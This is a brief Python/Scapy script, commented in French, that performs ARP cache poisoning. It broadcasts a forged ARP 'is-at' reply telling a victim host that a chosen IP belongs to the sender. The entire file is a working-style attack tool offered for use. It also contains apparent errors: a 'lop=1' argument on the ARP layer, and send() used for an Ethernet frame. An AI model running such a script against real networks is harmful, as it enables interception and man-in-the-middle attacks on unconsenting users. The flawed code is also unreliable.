from scapy.all import *
import ipaddress
import argparse


# Arguments
parser = argparse.ArgumentParser(description="ARP poisoning")

parser.add_argument("victimeIp", help="Adresse IP de la victime")
parser.add_argument("fakeIp", help="Fake Ip")

args = parser.parse_args()


# Variables

victimeIp=args.victimeIp
fakeIp=args.fakeIp

send(
    Ether(dst="ff:ff:ff:ff:ff:ff")/
    ARP(
        op="is-at",
        psrc=fakeIp, 
        pdst=victimeIp,
        lop=1
        )
    )



